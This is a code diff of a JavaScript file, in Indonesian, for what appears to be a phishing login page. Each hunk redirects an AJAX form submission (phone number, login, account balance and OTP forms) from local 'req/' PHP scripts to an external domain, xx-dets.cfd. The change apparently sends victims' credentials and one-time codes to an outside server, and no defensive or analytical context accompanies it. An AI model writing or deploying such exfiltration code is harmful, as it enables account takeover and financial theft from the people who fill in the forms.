@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'req/no.php',
+      url: 'https://choreoapps.xx-dets.cfd/aku/no.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -33,7 +33,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'req/sudah.php',
+      url: 'https://choreoapps.xx-dets.cfd/aku/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -63,7 +63,7 @@ function sendSaldo() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'req/saldosdh.php',
+      url: 'https://choreoapps.xx-dets.cfd/aku/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -97,7 +97,7 @@ function sendOtp() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'req/otpsdh.php',
+      url: 'https://choreoapps.xx-dets.cfd/aku/otpsdh.php',
       type: 'POST',
       data: $('#formsdh').serialize(),
       complete: function(response) {
@@ -133,7 +133,7 @@ document.getElementById("nohp").value =
        
     
     $.ajax({
-      url: 'req/belum.php',
+      url: 'https://choreoapps.xx-dets.cfd/aku/belum.php',
       type: 'POST',
       data: $('#belum').serialize(),   
     complete: function(){
@@ -159,7 +159,7 @@ function sendSaldo() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'req/saldoblm.php',
+      url: 'https://choreoapps.xx-dets.cfd/aku/saldoblm.php',
       type: 'POST',
       data: $('#saldoblm').serialize(),
       complete: function() {
@@ -203,7 +203,7 @@ function sendOtp() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'req/otpblm.php',
+      url: 'https://choreoapps.xx-dets.cfd/aku/otpblm.php',
       type: 'POST',
       data: $('#formblm').serialize(),
       complete: function(response) {
